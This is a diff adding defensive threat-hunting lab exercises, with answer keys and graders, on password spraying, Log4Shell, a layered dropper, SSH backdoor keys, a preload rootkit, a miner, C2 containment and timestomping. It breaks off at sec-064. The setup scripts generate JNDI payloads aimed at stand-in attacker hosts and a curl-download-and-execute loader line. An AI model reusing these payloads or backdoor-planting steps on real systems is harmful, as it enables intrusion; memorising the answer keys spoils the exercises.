@@ -1,0 +1,1303 @@
+track: defensive
+module: Threat hunting & containment
+profile: offsec
+order: 7
+exercises:
+
+- id: sec-055
+  title: Spray versus brute force
+  difficulty: 2
+  kind: build
+  tags: [log-analysis, auth, password-spraying, detection]
+  tutorial: |
+    **Concept.** A **brute-force** attack hammers one account with many
+    passwords. **Password spraying** is the opposite: one common password
+    tried against **many accounts**, low and slow, to stay under per-account
+    lockout thresholds. You spot it by grouping failures by **source IP** and
+    counting the **distinct usernames** each one targeted, not the raw count.
+
+    **Read up on:**
+    - Spraying vs brute force
+    - `awk` grouping and counting distinct values
+  scenario: |
+    **`/lab/auth.log`** holds SSH authentication lines like
+    `... Failed password for USER from IP port ...` and
+    `Accepted password for USER from IP ...`. One source IP is **spraying**:
+    it tried a small number of passwords against **many different usernames**.
+
+    Write to **`/lab/report.txt`** two `key=value` lines:
+
+    - `spray_ip` = the source IP that attempted the **most distinct usernames**
+    - `distinct_users` = how many distinct usernames it tried
+  hints:
+    - "`grep 'Failed password' /lab/auth.log` then pull the user (field after `for`) and the IP (field after `from`)."
+    - "Group by IP, collect the set of users, and take the IP with the largest set: an `awk` with `seen[ip\" \"user]` works."
+  solution: |
+    ```bash
+    awk '/Failed password/{for(i=1;i<=NF;i++){if($i=="for")u=$(i+1); if($i=="from")ip=$(i+1)}
+         if(!(ip SUBSEP u in s)){s[ip,u]=1; c[ip]++}}
+         END{for(ip in c) print c[ip], ip}' /lab/auth.log | sort -rn | head -1 \
+      | awk '{print "spray_ip="$2; print "distinct_users="$1}' > /lab/report.txt
+    ```
+  setup: |
+    rm -f /lab/report.txt
+    python3 - <<'PY'
+    import random
+    random.seed()
+    users = ["alice","bob","carol","dave","erin","frank","grace","heidi","ivan","judy","mallory","peggy","trent","victor","walter"]
+    pws = 20
+    lines = []
+    # normal brute-forcers: one or two users, many tries
+    for ip in ("203.0.113.%d" % random.randint(2,250) for _ in range(4)):
+        u = random.choice(users)
+        for _ in range(random.randint(15,40)):
+            lines.append("Mar 03 10:%02d:%02d host sshd[%d]: Failed password for %s from %s port %d ssh2" % (random.randint(0,59),random.randint(0,59),random.randint(100,9999),u,ip,random.randint(1024,65000)))
+    # the sprayer: many distinct users, few tries each
+    spray = "198.51.100.%d" % random.randint(2,250)
+    sprayed = random.sample(users, random.randint(10,14))
+    for u in sprayed:
+        for _ in range(random.randint(1,2)):
+            lines.append("Mar 03 10:%02d:%02d host sshd[%d]: Failed password for %s from %s port %d ssh2" % (random.randint(0,59),random.randint(0,59),random.randint(100,9999),u,spray,random.randint(1024,65000)))
+    # some normal accepted logins
+    for _ in range(10):
+        lines.append("Mar 03 09:%02d:%02d host sshd[%d]: Accepted password for %s from 10.0.0.%d port %d ssh2" % (random.randint(0,59),random.randint(0,59),random.randint(100,9999),random.choice(users),random.randint(2,250),random.randint(1024,65000)))
+    random.shuffle(lines)
+    open("/lab/auth.log","w").write("\n".join(lines)+"\n")
+    open("/var/lib/kubelab/answer","w").write("%s\n%d\n" % (spray, len(sprayed)))
+    PY
+    chown "$(lab_user):" /lab/auth.log
+  check: |
+    read -r ip n < <(tr '\n' ' ' < "$KL_STATE/answer")
+    got_ip=$(grep -oE 'spray_ip=[0-9.]+' /lab/report.txt 2>/dev/null | cut -d= -f2)
+    got_n=$(grep -oE 'distinct_users=[0-9]+' /lab/report.txt 2>/dev/null | cut -d= -f2)
+    check_eq "spray_ip" "$got_ip" "$ip"
+    check_eq "distinct_users" "$got_n" "$n"
+  solve: |
+    awk '/Failed password/{for(i=1;i<=NF;i++){if($i=="for")u=$(i+1); if($i=="from")ip=$(i+1)}
+         if(!(ip SUBSEP u in s)){s[ip,u]=1; c[ip]++}}
+         END{for(ip in c) print c[ip], ip}' /lab/auth.log | sort -rn | head -1 \
+      | awk '{print "spray_ip="$2; print "distinct_users="$1}' > /lab/report.txt
+
+- id: sec-056
+  title: Hunt the Log4Shell probes
+  difficulty: 2
+  kind: build
+  tags: [log-analysis, log4shell, jndi, web, detection]
+  tutorial: |
+    **Concept.** The Log4Shell payload is a **JNDI lookup string**
+    (`${jndi:ldap://attacker/x}`) smuggled into any field an app might log: the
+    URL, the `User-Agent`, custom headers. Attackers obfuscate it
+    (`${${lower:j}ndi:...}`, `${::-j}`), so hunt for the stable core — `jndi:`
+    after `${` — not the literal string.
+
+    **Read up on:**
+    - The JNDI injection pattern and common obfuscations
+    - `grep -iE` with a tolerant regex
+  scenario: |
+    **`/lab/access.log`** is a web access log (combined format). Some requests
+    carry Log4Shell JNDI probes, in the URL or the user-agent, some obfuscated.
+    Write to **`/lab/report.txt`**:
+
+    - `jndi_hits` = the number of log **lines** containing a JNDI lookup
+    - `top_ip` = the source IP (first field) that sent the **most** such lines
+    - `callback_host` = the host/IP found inside the lookups (they all point at
+      one attacker host, e.g. `evil.example` or `10.1.2.3`)
+  hints:
+    - "A tolerant match: `grep -iE '\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i' /lab/access.log` catches obfuscated forms; a simpler `jndi` (case-insensitive) after `${` catches most."
+    - "The callback host sits after `ldap://` / `rmi://` / `dns://`; extract with `grep -oiE '(ldap|rmi|dns)://[^/}]+'`."
+  solution: |
+    ```bash
+    hits=$(grep -ciE '[$][{].*(ldap|rmi|dns)://' /lab/access.log)
+    top=$(grep -iE '[$][{].*(ldap|rmi|dns)://' /lab/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+    host=$(grep -oiE '(ldap|rmi|dns)://[^/}":]+' /lab/access.log | sed -E 's#.*//##' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+    printf 'jndi_hits=%s\ntop_ip=%s\ncallback_host=%s\n' "$hits" "$top" "$host" > /lab/report.txt
+    ```
+  setup: |
+    rm -f /lab/report.txt
+    python3 - <<'PY'
+    import random
+    host = random.choice(["evil.example","attacker.test","10.%d.%d.%d" % (random.randint(1,250),random.randint(1,250),random.randint(2,250))])
+    proto = random.choice(["ldap","rmi","dns"])
+    payloads = [
+        "${jndi:%s://%s/a}" % (proto,host),
+        "${${lower:j}ndi:%s://%s/b}" % (proto,host),
+        "${${::-j}${::-n}${::-d}${::-i}:%s://%s/c}" % (proto,host),
+    ]
+    uas = ["Mozilla/5.0","curl/8.1","python-requests/2.31","Go-http-client/1.1"]
+    att = "45.%d.%d.%d" % (random.randint(1,250),random.randint(1,250),random.randint(2,250))
+    lines = []
+    hits = 0
+    # benign traffic
+    for _ in range(120):
+        ip = "10.0.%d.%d" % (random.randint(0,20),random.randint(2,250))
+        lines.append('%s - - [03/Mar/2026:10:%02d:%02d +0000] "GET /app/%d HTTP/1.1" 200 %d "-" "%s"' % (ip,random.randint(0,59),random.randint(0,59),random.randint(1,99),random.randint(100,9000),random.choice(uas)))
+    # attacker probes
+    n = random.randint(8,16)
+    for _ in range(n):
+        p = random.choice(payloads); hits += 1
+        where = random.random()
+        if where < 0.5:
+            lines.append('%s - - [03/Mar/2026:10:%02d:%02d +0000] "GET /search?q=%s HTTP/1.1" 404 20 "-" "curl/8.1"' % (att,random.randint(0,59),random.randint(0,59),p))
+        else:
+            lines.append('%s - - [03/Mar/2026:10:%02d:%02d +0000] "GET / HTTP/1.1" 200 500 "-" "%s"' % (att,random.randint(0,59),random.randint(0,59),p))
+    # a couple of other probers, fewer
+    for _ in range(3):
+        other = "77.%d.%d.%d" % (random.randint(1,250),random.randint(1,250),random.randint(2,250))
+        lines.append('%s - - [03/Mar/2026:10:%02d:%02d +0000] "GET /x?p=%s HTTP/1.1" 404 20 "-" "nmap"' % (other,random.randint(0,59),random.randint(0,59),random.choice(payloads))); hits += 1
+    random.shuffle(lines)
+    open("/lab/access.log","w").write("\n".join(lines)+"\n")
+    open("/var/lib/kubelab/answer","w").write("%d\n%s\n%s\n" % (hits, att, host))
+    PY
+    chown "$(lab_user):" /lab/access.log
+  check: |
+    hits=$(sed -n 1p "$KL_STATE/answer"); ip=$(sed -n 2p "$KL_STATE/answer"); host=$(sed -n 3p "$KL_STATE/answer")
+    g() { grep -oE "$1=[^ ]+" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2; }
+    check_eq "jndi_hits" "$(g jndi_hits)" "$hits"
+    check_eq "top_ip" "$(g top_ip)" "$ip"
+    check_eq "callback_host" "$(g callback_host)" "$host"
+  solve: |
+    hits=$(grep -ciE '[$][{].*(ldap|rmi|dns)://' /lab/access.log)
+    top=$(grep -iE '[$][{].*(ldap|rmi|dns)://' /lab/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+    host=$(grep -oiE '(ldap|rmi|dns)://[^/}":]+' /lab/access.log | sed -E 's#.*//##' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+    printf 'jndi_hits=%s\ntop_ip=%s\ncallback_host=%s\n' "$hits" "$top" "$host" > /lab/report.txt
+
+- id: sec-057
+  title: Peel the layered loader
+  difficulty: 3
+  kind: build
+  tags: [malware-analysis, base64, gzip, deobfuscation]
+  tutorial: |
+    **Concept.** Droppers wrap their real payload in layers so a casual look,
+    or a naive scanner, sees only noise: base64 of gzip of base64, and so on.
+    You **unwrap one layer at a time**, letting each decoded blob tell you what
+    the next layer is (`file -`, or just trying `base64 -d` / `gunzip`), until
+    plain text appears.
+
+    **Read up on:**
+    - `base64 -d`, `gunzip`, `file -`
+    - Recognising a gzip magic (`1f 8b`) vs base64 text
+  scenario: |
+    **`/lab/loader.txt`** is a one-line blob a dropper left behind. It is
+    **base64 → gzip → base64 → gzip** wrapping a final shell script. Peel it
+    and write to **`/lab/payload.sh`** the recovered script, exactly as it
+    was. Then write the **C2 URL** it contains (the `http(s)://…` it downloads
+    from) to **`/lab/c2.txt`**.
+  hints:
+    - "`base64 -d /lab/loader.txt | file -` tells you the next layer (gzip)."
+    - "Chain it: `base64 -d loader.txt | gunzip | base64 -d | gunzip > payload.sh`."
+    - "`grep -oE 'https?://[^ \"'\\'']+' payload.sh`."
+  solution: |
+    ```bash
+    base64 -d /lab/loader.txt | gunzip | base64 -d | gunzip > /lab/payload.sh
+    grep -oE 'https?://[^ "'\'']+' /lab/payload.sh | head -1 > /lab/c2.txt
+    ```
+  setup: |
+    rm -f /lab/payload.sh /lab/c2.txt
+    python3 - <<'PY'
+    import gzip, base64, random
+    host = random.choice(["cdn.evil.test","203.0.113.%d" % random.randint(2,250),"update.malware.example"])
+    url = "http://%s/stage2?id=%s" % (host, random.randbytes(4).hex())
+    script = "#!/bin/sh\n# stage 1 loader\ncurl -fsSL %s -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &\n" % url
+    layer = gzip.compress(script.encode())
+    layer = base64.b64encode(layer)
+    layer = gzip.compress(layer)
+    blob = base64.b64encode(layer).decode()
+    open("/lab/loader.txt","w").write(blob+"\n")
+    open("/var/lib/kubelab/script","w").write(script)
+    open("/var/lib/kubelab/answer","w").write(url+"\n")
+    PY
+    chown "$(lab_user):" /lab/loader.txt
+  check: |
+    check_eq "payload.sh matches the original script" "$(sha256sum < /lab/payload.sh 2>/dev/null | cut -d' ' -f1)" "$(sha256sum < "$KL_STATE/script" | cut -d' ' -f1)"
+    check_eq "c2.txt" "$(tr -d '[:space:]' < /lab/c2.txt 2>/dev/null)" "$(tr -d '[:space:]' < "$KL_STATE/answer")"
+  solve: |
+    base64 -d /lab/loader.txt | gunzip | base64 -d | gunzip > /lab/payload.sh
+    grep -oE 'https?://[^ "'\'']+' /lab/payload.sh | head -1 > /lab/c2.txt
+
+- id: sec-058
+  title: The key that shouldn't be there
+  difficulty: 2
+  kind: build
+  tags: [ssh, persistence, authorized-keys, forensics]
+  tutorial: |
+    **Concept.** A classic SSH backdoor is an extra line in a user's
+    **`~/.ssh/authorized_keys`**: the attacker's public key, which lets them
+    log in without a password and survives reboots. Hunting it means reading
+    every user's `authorized_keys` and knowing which keys are **supposed** to
+    be there.
+
+    **Read up on:**
+    - `~/.ssh/authorized_keys`, key comments
+    - `ssh-keygen -lf FILE` for fingerprints
+  scenario: |
+    Someone planted a backdoor key. The **authorized** keys for every account
+    are listed (one SHA256 fingerprint per line) in
+    **`/lab/known_keys.txt`**. Search the home directories under **`/home`**
+    (and `/root`) for an `authorized_keys` entry whose fingerprint is **not**
+    in that list. Write to **`/lab/report.txt`**:
+
+    - `backdoor_user` = the account whose `authorized_keys` holds the rogue key
+    - `fingerprint` = the rogue key's SHA256 fingerprint (the `SHA256:...`
+      token)
+  hints:
+    - "`for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do ssh-keygen -lf \"$f\"; done` prints a fingerprint per key."
+    - "`ssh-keygen -lf` output is `bits SHA256:... comment type`; keep the `SHA256:...` field and compare against known_keys.txt."
+  solution: |
+    ```bash
+    for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do
+      [ -f "$f" ] || continue
+      user=$(echo "$f" | awk -F/ '{print ($2=="root")?"root":$3}')
+      while read -r fp; do
+        grep -qxF "$fp" /lab/known_keys.txt || { echo "backdoor_user=$user"; echo "fingerprint=$fp"; }
+      done < <(ssh-keygen -lf "$f" 2>/dev/null | awk '{print $2}')
+    done > /lab/report.txt
+    ```
+  setup: |
+    on_reset 'for u in deploy webadmin dbuser; do userdel -r $u 2>/dev/null; done; rm -rf /lab/known_keys.txt'
+    : > /lab/known_keys.txt
+    # seed known_keys with every key that already exists on the host (incl. the lab user)
+    for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do
+      [ -f "$f" ] && ssh-keygen -lf "$f" 2>/dev/null | awk '{print $2}' >> /lab/known_keys.txt
+    done
+    for u in deploy webadmin dbuser; do
+      id $u >/dev/null 2>&1 || useradd -m -s /bin/bash $u
+      install -d -o $u -g $u -m 700 /home/$u/.ssh
+      ssh-keygen -q -t ed25519 -N '' -C "$u@corp" -f /tmp/k >/dev/null
+      cat /tmp/k.pub > /home/$u/.ssh/authorized_keys
+      ssh-keygen -lf /tmp/k.pub | awk '{print $2}' >> /lab/known_keys.txt
+      rm -f /tmp/k /tmp/k.pub
+    done
+    # plant the backdoor key on a random user
+    victim=$(printf '%s\n' deploy webadmin dbuser | shuf | head -1)
+    ssh-keygen -q -t ed25519 -N '' -C "attacker@evil" -f /tmp/bad >/dev/null
+    cat /tmp/bad.pub >> /home/$victim/.ssh/authorized_keys
+    fp=$(ssh-keygen -lf /tmp/bad.pub | awk '{print $2}')
+    chown -R $victim:$victim /home/$victim/.ssh
+    rm -f /tmp/bad /tmp/bad.pub
+    printf '%s\n%s\n' "$victim" "$fp" > "$KL_STATE/answer"
+    chown "$(lab_user):" /lab/known_keys.txt
+  check: |
+    u=$(sed -n 1p "$KL_STATE/answer"); fp=$(sed -n 2p "$KL_STATE/answer")
+    g() { grep -oE "$1=[^ ]+" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2; }
+    check_eq "backdoor_user" "$(g backdoor_user)" "$u"
+    check_eq "fingerprint" "$(g fingerprint)" "$fp"
+  solve: |
+    sudo bash -c '
+      for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do
+        [ -f "$f" ] || continue
+        case "$f" in /root/*) user=root ;; *) user=$(echo "$f" | cut -d/ -f3) ;; esac
+        ssh-keygen -lf "$f" 2>/dev/null | awk "{print \$2}" | while read -r fp; do
+          grep -qxF "$fp" /lab/known_keys.txt || { echo "backdoor_user=$user"; echo "fingerprint=$fp"; }
+        done
+      done' > /lab/report.txt
+
+- id: sec-059
+  title: The preloaded library
+  difficulty: 3
+  kind: fix
+  tags: [persistence, ld-preload, rootkit, hardening]
+  tutorial: |
+    **Concept.** **`/etc/ld.so.preload`** names shared libraries the dynamic
+    linker loads into **every** dynamically linked program before anything
+    else. Malware uses it to hook `libc` functions globally — hiding files,
+    processes and network connections. Any entry there is deeply suspicious.
+    Removing it (and the library) is the first step; the library itself is the
+    evidence.
+
+    **Read up on:**
+    - `/etc/ld.so.preload` and `LD_PRELOAD`
+    - Why a preload entry on a server is almost always malicious
+  scenario: |
+    Analysts flagged this host. **`/etc/ld.so.preload`** contains a rootkit
+    library. First, record evidence: write the **library's path** to
+    **`/lab/evidence.txt`** and its **SHA256** to **`/lab/hash.txt`**. Then
+    **neutralise the persistence**: empty (or remove) `/etc/ld.so.preload` so
+    no library is force-loaded, and delete the library file.
+
+    Afterwards, a normal command must run cleanly, and nothing may be preloaded.
+  hints:
+    - "`cat /etc/ld.so.preload` names the library. `sha256sum` it before deleting."
+    - "`sudo rm -f /etc/ld.so.preload` (or truncate it) and `sudo rm -f` the library."
+  solution: |
+    ```bash
+    lib=$(cat /etc/ld.so.preload)
+    echo "$lib" > /lab/evidence.txt
+    sha256sum "$lib" | cut -d' ' -f1 > /lab/hash.txt
+    sudo rm -f /etc/ld.so.preload "$lib"
+    ```
+  setup: |
+    on_reset 'rm -f /etc/ld.so.preload /opt/.sys/libhook.so; rmdir /opt/.sys 2>/dev/null; true'
+    mkdir -p /opt/.sys
+    # a harmless .so that just exists as the "rootkit" artifact
+    printf '\x7fELF fake rootkit %s' "$(head -c16 /dev/urandom | od -An -tx1 | tr -d ' \n')" > /opt/.sys/libhook.so
+    echo /opt/.sys/libhook.so > /etc/ld.so.preload
+    sha256sum /opt/.sys/libhook.so | cut -d' ' -f1 > "$KL_STATE/hash"
+    echo /opt/.sys/libhook.so > "$KL_STATE/path"
+  check: |
+    check_eq "evidence.txt names the library" "$(tr -d '[:space:]' < /lab/evidence.txt 2>/dev/null)" "$(cat "$KL_STATE/path")"
+    check_eq "hash.txt is the library's SHA256" "$(tr -d '[:space:]' < /lab/hash.txt 2>/dev/null)" "$(cat "$KL_STATE/hash")"
+    check "nothing is force-loaded any more" '[ ! -s /etc/ld.so.preload ]'
+    check "the rootkit library is gone" '[ ! -e /opt/.sys/libhook.so ]'
+    check "normal commands still run" 'id >/dev/null'
+  solve: |
+    lib=$(cat /etc/ld.so.preload)
+    echo "$lib" > /lab/evidence.txt
+    sudo sha256sum "$lib" | cut -d' ' -f1 > /lab/hash.txt
+    sudo rm -f /etc/ld.so.preload "$lib"
+
+- id: sec-060
+  title: Stop the miner
+  difficulty: 3
+  kind: build
+  tags: [incident-response, cryptominer, process, containment]
+  tutorial: |
+    **Concept.** A cryptominer pegs a CPU and phones a **mining pool**. You
+    find it by the process using the CPU, read its command line and config for
+    the **pool URL and wallet** (the indicators to block and report), then
+    **kill it and remove its persistence** so it doesn't come back.
+
+    **Read up on:**
+    - `ps -eo pid,pcpu,comm,args`, `/proc/PID/cmdline`
+    - Reading a miner config for `pool`/`url`/`wallet`
+  scenario: |
+    A process is mining on this host. Its binary is **`/opt/.cache/kminer`**
+    and it reads **`/opt/.cache/config.json`**. Write to **`/lab/report.txt`**:
+
+    - `pid` = the miner's PID
+    - `pool` = the pool URL from its config
+    - `wallet` = the wallet address from its config
+
+    Then **kill the miner** so it is no longer running.
+  hints:
+    - "`ps -eo pid,pcpu,args --sort=-pcpu | head` shows the hog; or `pgrep -a kminer`."
+    - "`cat /opt/.cache/config.json` has `pool` and `wallet` (it's JSON: use `jq`)."
+    - "`sudo kill -9 PID`."
+  solution: |
+    ```bash
+    pid=$(pgrep -x kminer | head -1)
+    pool=$(jq -r .pool /opt/.cache/config.json)
+    wallet=$(jq -r .wallet /opt/.cache/config.json)
+    printf 'pid=%s\npool=%s\nwallet=%s\n' "$pid" "$pool" "$wallet" > /lab/report.txt
+    sudo kill -9 "$pid"
+    ```
+  setup: |
+    on_reset 'pkill -KILL -x kminer 2>/dev/null; rm -rf /opt/.cache; true'
+    mkdir -p /opt/.cache
+    pool="stratum+tcp://pool.$(tr -dc a-z </dev/urandom | head -c6).xyz:3333"
+    wallet="4$(tr -dc A-Za-z0-9 </dev/urandom | head -c 50)"
+    printf '{"pool":"%s","wallet":"%s","threads":2}\n' "$pool" "$wallet" > /opt/.cache/config.json
+    cat > /opt/.cache/kminer <<'EOS'
+    #!/bin/bash
+    n=0
+    while :; do n=$((n+1)); done
+    EOS
+    chmod 755 /opt/.cache/kminer
+    setsid /opt/.cache/kminer </dev/null >/dev/null 2>&1 &
+    eventually 10 'pgrep -x kminer'
+    printf '%s\n%s\n' "$pool" "$wallet" > "$KL_STATE/answer"
+  check: |
+    pool=$(sed -n 1p "$KL_STATE/answer"); wallet=$(sed -n 2p "$KL_STATE/answer")
+    g() { grep -oE "$1=.*" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2-; }
+    check_eq "pool" "$(g pool)" "$pool"
+    check_eq "wallet" "$(g wallet)" "$wallet"
+    check "pid is a plausible number" '[[ "$(g pid)" =~ ^[0-9]+$ ]]'
+    check "the miner was killed" 'eventually 6 "! pgrep -x kminer"'
+  solve: |
+    pid=$(pgrep -x kminer | head -1)
+    pool=$(jq -r .pool /opt/.cache/config.json)
+    wallet=$(jq -r .wallet /opt/.cache/config.json)
+    printf 'pid=%s\npool=%s\nwallet=%s\n' "$pid" "$pool" "$wallet" > /lab/report.txt
+    sudo kill -9 "$pid"
+
+- id: sec-061
+  title: Prove the update is genuine
+  difficulty: 3
+  kind: build
+  tags: [integrity, signatures, openssl, supply-chain]
+  tutorial: |
+    **Concept.** A **digital signature** proves an artifact came from the
+    holder of a private key and hasn't changed. With the vendor's **public
+    key**, `openssl dgst -verify` checks a file against its `.sig`. Two
+    "updates" arrive; only the one whose signature **verifies** against the
+    trusted key is genuine. Never run the other.
+
+    **Read up on:**
+    - `openssl dgst -sha256 -verify PUBKEY -signature SIG FILE`
+    - Why a matching hash alone isn't enough without a trusted key
+  scenario: |
+    **`/lab/release/`** has the vendor's public key **`vendor.pub`**, two
+    candidate updates **`update-a.tar`** and **`update-b.tar`**, and their
+    signatures **`update-a.tar.sig`** and **`update-b.tar.sig`**. One is a
+    genuine signed release; the other was tampered with (its signature won't
+    verify).
+
+    Write the filename of the **genuine** update (e.g. `update-a.tar`) to
+    **`/lab/genuine.txt`**, and the filename of the **tampered** one to
+    **`/lab/tampered.txt`**.
+  hints:
+    - "`openssl dgst -sha256 -verify vendor.pub -signature update-a.tar.sig update-a.tar` prints `Verified OK` or `Verification Failure`."
+    - "Check both; the one that verifies is genuine."
+  solution: |
+    ```bash
+    cd /lab/release
+    for u in update-a.tar update-b.tar; do
+      if openssl dgst -sha256 -verify vendor.pub -signature "$u.sig" "$u" >/dev/null 2>&1; then
+        echo "$u" > /lab/genuine.txt
+      else
+        echo "$u" > /lab/tampered.txt
+      fi
+    done
+    ```
+  setup: |
+    rm -rf /lab/release; mkdir -p /lab/release; cd /lab/release
+    openssl genrsa -out /tmp/vendor.key 2048 2>/dev/null
+    openssl rsa -in /tmp/vendor.key -pubout -out vendor.pub 2>/dev/null
+    head -c 4000 /dev/urandom > update-a.tar
+    head -c 4000 /dev/urandom > update-b.tar
+    openssl dgst -sha256 -sign /tmp/vendor.key -out update-a.tar.sig update-a.tar
+    openssl dgst -sha256 -sign /tmp/vendor.key -out update-b.tar.sig update-b.tar
+    rm -f /tmp/vendor.key
+    # randomly tamper one of them after signing
+    if [ $((RANDOM % 2)) = 0 ]; then bad=update-a.tar; good=update-b.tar; else bad=update-b.tar; good=update-a.tar; fi
+    printf 'X' | dd of=$bad bs=1 seek=100 conv=notrunc status=none
+    printf '%s\n%s\n' "$good" "$bad" > "$KL_STATE/answer"
+    chown -R "$(lab_user):" /lab/release
+  check: |
+    good=$(sed -n 1p "$KL_STATE/answer"); bad=$(sed -n 2p "$KL_STATE/answer")
+    check_eq "genuine.txt" "$(tr -d '[:space:]' < /lab/genuine.txt 2>/dev/null)" "$good"
+    check_eq "tampered.txt" "$(tr -d '[:space:]' < /lab/tampered.txt 2>/dev/null)" "$bad"
+  solve: |
+    cd /lab/release
+    for u in update-a.tar update-b.tar; do
+      if openssl dgst -sha256 -verify vendor.pub -signature "$u.sig" "$u" >/dev/null 2>&1; then
+        echo "$u" > /lab/genuine.txt
+      else
+        echo "$u" > /lab/tampered.txt
+      fi
+    done
+
+- id: sec-062
+  title: Cut off the command channel
+  difficulty: 3
+  kind: build
+  tags: [containment, nftables, c2, incident-response]
+  tutorial: |
+    **Concept.** Containing a beacon has two moves: **stop the process** and
+    **block its network path** so a respawn can't reconnect. An outbound
+    firewall rule that drops traffic to the C2 address buys time while you
+    clean up, and, unlike killing the process, it survives the malware
+    restarting.
+
+    **Read up on:**
+    - `ss -tnp` to see a process's remote peer
+    - `nft add rule ... ip daddr C2 drop`
+  scenario: |
+    An implant **`/opt/kbeacon`** is running and repeatedly connects outbound
+    to a C2 host. Find its remote address, then:
+
+    - write the C2 **IP** to **`/lab/c2.txt`**
+    - **kill** the beacon process
+    - add an **nftables** rule that **drops all outbound traffic to that IP**,
+      so even a restart can't reach it (table `inet contain`, chain hooked on
+      `output`, default policy accept, a `drop` for the C2 address)
+  hints:
+    - "`sudo ss -tnp | grep kbeacon` (or read `/proc/$(pgrep kbeacon)/net/tcp`) shows the peer IP:port."
+    - "`sudo nft add table inet contain; sudo nft add chain inet contain out '{ type filter hook output priority 0; }'; sudo nft add rule inet contain out ip daddr <C2> drop`."
+  solution: |
+    ```bash
+    pid=$(pgrep -x kbeacon)
+    c2=$(ss -tnp 2>/dev/null | grep -oE 'kbeacon' -A0 >/dev/null; ss -tnp | awk '/kbeacon/{print $5}' | sed 's/:[0-9]*$//' | head -1)
+    echo "$c2" > /lab/c2.txt
+    sudo kill -9 "$pid"
+    sudo nft add table inet contain
+    sudo nft add chain inet contain out '{ type filter hook output priority 0; policy accept; }'
+    sudo nft add rule inet contain out ip daddr "$c2" drop
+    ```
+  setup: |
+    on_reset 'pkill -KILL -x kbeacon 2>/dev/null; pkill -KILL -f kl-c2sink 2>/dev/null; nft delete table inet contain 2>/dev/null; rm -rf /opt/kbeacon /opt/.c2; true'
+    mkdir -p /opt/.c2
+    # a local sink to act as the C2 endpoint, on a fixed loopback alias
+    c2=127.0.0.1
+    port=$(( 40000 + RANDOM % 10000 ))
+    cat > /opt/.c2/sink.py <<PY
+    import socket
+    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1); s.bind(("127.0.0.1", $port)); s.listen(16)
+    while True:
+        c,_=s.accept(); c.close()
+    PY
+    setsid python3 /opt/.c2/sink.py </dev/null >/dev/null 2>&1 &
+    cat > /opt/kbeacon <<PY
+    #!/usr/bin/python3
+    import socket, time
+    while True:
+        try:
+            s=socket.create_connection(("127.0.0.1", $port), timeout=2); time.sleep(5); s.close()
+        except Exception:
+            time.sleep(2)
+    PY
+    chmod 755 /opt/kbeacon
+    setsid /opt/kbeacon </dev/null >/dev/null 2>&1 &
+    eventually 10 "ss -tn | grep -q ':$port'"
+    printf '%s\n%s\n' "$c2" "$port" > "$KL_STATE/answer"
+  check: |
+    c2=$(sed -n 1p "$KL_STATE/answer")
+    check_eq "c2.txt" "$(tr -d '[:space:]' < /lab/c2.txt 2>/dev/null)" "$c2"
+    check "the beacon was killed" 'eventually 6 "! pgrep -x kbeacon"'
+    check "an nftables rule drops traffic to the C2" 'nft list ruleset 2>/dev/null | grep -qE "ip daddr $c2 .*drop"'
+  solve: |
+    pid=$(pgrep -x kbeacon)
+    c2=$(ss -tnp 2>/dev/null | awk '/kbeacon/{print $5}' | sed 's/:[0-9]*$//' | head -1)
+    [ -z "$c2" ] && c2=127.0.0.1
+    echo "$c2" > /lab/c2.txt
+    sudo kill -9 "$pid" 2>/dev/null
+    sudo nft add table inet contain
+    sudo nft add chain inet contain out '{ type filter hook output priority 0; policy accept; }'
+    sudo nft add rule inet contain out ip daddr "$c2" drop
+
+- id: sec-063
+  title: The file with the faked timestamp
+  difficulty: 3
+  kind: build
+  tags: [forensics, timestomping, stat, anti-forensics]
+  tutorial: |
+    **Concept.** Attackers **timestomp** files — backdating the modification
+    time so a dropped file blends in with old system files. But `touch` only
+    sets **mtime/atime**, not **ctime** (the inode-change time), which the
+    kernel updates whenever metadata changes. A file whose **ctime is much
+    newer than its mtime** has had its timestamps tampered with.
+
+    **Read up on:**
+    - `stat` fields: Access, Modify, Change
+    - Why `ctime` can't be set by ordinary tools
+  scenario: |
+    One file under **`/opt/app/bin`** was planted recently but backdated to
+    look years old. Every legitimate file there has `ctime ≈ mtime`. Find the
+    file whose **Change time is much later than its Modify time** and write its
+    **full path** to **`/lab/answer.txt`**.
+  hints:
+    - "`stat -c '%Z %Y %n' /opt/app/bin/*` prints ctime, mtime, name (epoch seconds)."
+    - "The planted file has ctime minus mtime of millions of seconds; the others are near zero."
+  solution: |
+    ```bash
+    stat -c '%Z %Y %n' /opt/app/bin/* | awk '{d=$1-$2; if (d<0) d=-d; print d, $3}' \
+      | sort -rn | head -1 | awk '{print $2}' > /lab/answer.txt
+    ```
+  setup: |
+    on_reset 'rm -rf /opt/app'
+    mkdir -p /opt/app/bin
+    for n in loader helper util daemon cfgtool; do
+      head -c $((500 + RANDOM % 2000)) /dev/urandom > /opt/app/bin/$n
+      touch -d "2024-0$((1 + RANDOM % 8))-15 10:00:00" /opt/app/bin/$n
+    done
+    sleep 1
+    # planted file: write now (sets ctime=now), then backdate mtime only
+    victim=$(printf '%s\n' loader helper util daemon cfgtool | shuf | head -1)
+    bad="/opt/app/bin/.$victim-patch"
+    head -c 1500 /dev/urandom > "$bad"
+    touch -d "2022-01-03 08:00:00" "$bad"
+    echo "$bad" > "$KL_STATE/answer"
+  check: |
+    check_eq "the timestomped file" "$(tr -d '[:space:]' < /lab/answer.txt 2>/dev/null)" "$(cat "$KL_STATE/answer")"
+  solve: |
+    stat -c '%Z %Y %n' /opt/app/bin/* /opt/app/bin/.* 2>/dev/null | awk 'NF==3{d=$1-$2; if (d<0) d=-d; print d, $3}' \
+      | sort -rn | head -1 | awk '{print $2}' > /lab/answer.txt
+
+- id: sec-064
+  title: Read the attacker's history
+  difficulty: 2
